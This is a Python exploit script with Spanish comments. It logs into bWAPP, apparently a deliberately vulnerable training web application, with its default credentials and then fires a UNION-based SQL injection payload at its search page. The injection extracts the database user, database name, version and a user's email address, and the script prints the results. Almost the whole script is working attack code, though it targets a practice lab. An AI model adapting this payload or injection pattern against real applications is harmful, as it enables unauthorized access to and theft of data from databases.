import requests
import urllib
import argparse
import re
from bs4 import BeautifulSoup


user = "bee"
password = "bug"



##Función que realiza una conexión al sitio vulnerable de acuerdo a la IP, usuario y password.
##Se reconoce si las credenciales son correctas de acuerdo al mensaje de respuesta recibido. 
##Se agrega control de errores.
def Autenticacion(ip, user, password):
    s = requests.Session()
    data = {"login":user, "password": password, "security_level":"0","form":"submit"}
    urlLogin = f"http://{ip}/bWAPP/login.php"
    try:
        req = s.post(urlLogin, data=data, allow_redirects=True)
        #print(req.text)
    except Exception as e:
        print(f"Error al conectar con el host: {e}")
        exit()
    #validar mediante un mensaje de la respuesta que la autenticación fue exitosa
    print('Probando credenciales: '+user +':' +password)
    if "or a buggy web application" in req.text:
        print("¡¡¡¡¡¡¡¡Ingreso exitoso!!!!!!!!")
        # extracción del e-mail del usuario bee con inyección sql
        sqli(s,ip)
    elif "Invalid credentials or user not activated" in req.text:
        print("Invalid credentials")
    else:
        print("Hubo un problema")

##SQL Injection
##realiza una inyección SQL y busca el email del usuario 'bee'. 
##La inyección SQL se realiza mediante la concatenación de funciones SQL para obtener información de la base de datos subyacente, incluyendo el email del usuario 'bee'.
def sqli(s,ip):
    #inyección que busca el mail del usuario bee
    payload = urllib.parse.quote_plus("iron' union select 1,user(),database(),(select GROUP_CONCAT(\'email:\',email,\'\n\') from users where login = \'bee\'),version(),6,7-- -")
    url = f"http://{ip}/bWAPP/sqli_1.php?title={payload}&action=search"
    cookie = {'PHPSESSID':'e35379fb274f685034d95003c9a8db88', 'security_level':'0'}
    r = s.get(url, cookies=cookie)
    # crear objeto Beautiful Soup a partir del contenido de la respuesta
    soup = BeautifulSoup(r.content, 'html.parser')
    # buscar el string utilizando una expresión regular
    regex = re.compile(r'email:([^\s]+)')
    email = soup.find(text=regex)
    if email:
        print("El email es:", email.split(':')[1].strip())
    else:
        print("No se pudo encontrar el email")

##En la función principal se controlan los argumentos recibidos y se hace la Autenticación de acuerdo al usuario y contraseña configurado.
def main():
    parser = argparse.ArgumentParser(description='SQLi en bWAPP')
    parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
    args = parser.parse_args()

    print("[+] - Iniciando")
    Autenticacion(args.ip, user, password)
    print("[+] - Finalizado")
if __name__ == "__main__":
    main()
